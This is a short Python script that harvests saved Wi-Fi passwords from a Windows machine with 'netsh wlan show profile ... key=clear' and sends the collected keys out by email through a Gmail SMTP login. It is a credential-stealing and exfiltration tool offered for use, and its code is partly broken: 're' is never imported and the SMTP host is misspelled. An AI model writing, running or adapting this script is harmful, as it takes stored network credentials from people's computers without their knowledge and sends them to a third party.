#!/usr/bin/env python

import subprocess, smtplib

def send_mail(email, password, message):
    # SMTP server, followed by the port
    server = smtplib.SMTP("smpt.gmail.com", 587)
    # Transport Layer Security
    # TLS is a cryptographic protocol that provides end-to-end security of data sent between applications over the Internet
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
# Pass created from app passwords in the security of the myaccount.google.com
network_names_list = re.findall("(?:Profile\s*:\s)(.*)",networks)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result += current_result

send_mail("mail_id", "pass", result)

